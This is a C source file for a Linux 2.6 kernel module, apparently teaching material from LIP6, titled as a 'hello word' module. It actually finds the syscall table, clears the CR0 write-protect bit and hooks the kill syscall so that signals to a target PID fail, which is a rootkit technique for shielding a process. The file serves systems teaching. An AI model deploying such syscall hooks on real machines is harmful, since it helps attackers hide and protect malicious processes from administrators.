/*
 * =======================================================================
 *
 *       Filename:  helloword.c
 *
 *    Description:  Module "hello word" pour noyau 2.6
 *
 *        Version:  1.0
 *        Created:  09/10/2009 13:53:46
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  J. Sopena, Romain Pesche, Mounir Nasr Allah
 *        Company:  LIP6
 *
 * =======================================================================
 */
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/fs.h>
#include <linux/syscalls.h>



#define WRITE_PROTECT_BIT (1 << 16)
long pidtarget = 1;
long (*save_syskill)(int, long);

MODULE_DESCRIPTION("Module \"hello word2\" pour noyau 2.6");
MODULE_AUTHOR("Julien Sopena, LIP62");
MODULE_LICENSE("GPL");

//module_param(pidtarget, long, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
//MODULE_PARM_DESC(pidtarget, "PID target");


long mykill(int pid, long sig)
{
  if(pid == pidtarget)
     return -ESRCH;
  return save_syskill(pid, sig);
}

unsigned long * find_sys_call_table(void)
{
  unsigned long * ptr;

  for ( ptr = PAGE_OFFSET; ptr < ULLONG_MAX; ptr++ ) {
    if ( ptr[__NR_close] == (unsigned long *) sys_close ) {
      printk(KERN_ALERT "Find %p\n", ptr);
      break;
    }
  }
  return ptr;
}

static int hello_init(void)
{
  unsigned long * systable;
  unsigned long cr0;

  systable = find_sys_call_table();
  save_syskill = systable[__NR_kill];
  cr0 = read_cr0();
  write_cr0(cr0 & (~WRITE_PROTECT_BIT));
  systable[__NR_kill] = mykill;
  write_cr0(cr0);


  printk(KERN_ALERT "Hello, hide %d\n", pidtarget);
  return 0;
}

static void hello_exit(void)
{
  unsigned long * systable;
  unsigned long cr0;

  systable = find_sys_call_table();
  cr0 = read_cr0();
  write_cr0(cr0 & (~WRITE_PROTECT_BIT));
  systable[__NR_kill] = save_syskill;
  write_cr0(cr0);

  printk(KERN_ALERT "Goodbye, cruel\n");
}

module_init(hello_init);

module_exit(hello_exit);

